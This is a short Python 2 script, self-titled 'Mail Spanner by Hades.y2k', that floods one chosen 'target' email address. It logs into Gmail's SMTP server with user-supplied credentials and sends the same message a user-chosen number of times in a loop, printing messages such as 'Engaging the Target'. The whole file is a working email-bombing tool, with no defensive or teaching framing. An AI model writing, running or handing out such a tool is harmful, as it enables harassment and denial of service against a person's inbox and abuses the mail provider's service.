# Mail Spanner by Hades.y2k
# <29/05/2015>

import smtplib
import datetime

class spanner():

    def __init__(self):
        self.spantp()

    def spantp(self):
        print "\t/*----------------------------*/"
        print "\t/* MAIL SPANNER BY HADES.Y2K */"
        print "\t/*---------------------------*/\n"

        youradd = raw_input("Enter Your Email. ")
        targetadd = raw_input("Enter Your Target Email. ")
        
        # Credentials
        username = raw_input("Enter the Username: ")
        password = raw_input("Enter the Password: ")

        subj = raw_input("Enter Your Email Subject ")
        txt = raw_input("Enter the Message You Want to Send. ")
        spans = int(raw_input("How Many Times Do You Wanna Spans? "))

        date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
        msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s" % (youradd, targetadd, subj, date, txt)

        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username, password)

        print "[!] Engaging the Target.\n"
        for i in xrange(spans):
            server.sendmail(youradd, targetadd, msg)
            print "[!] Message Sent."
        server.quit()
        print "\n[!] Target Engaging Complete."

if __name__ == "__main__":
    spanner()
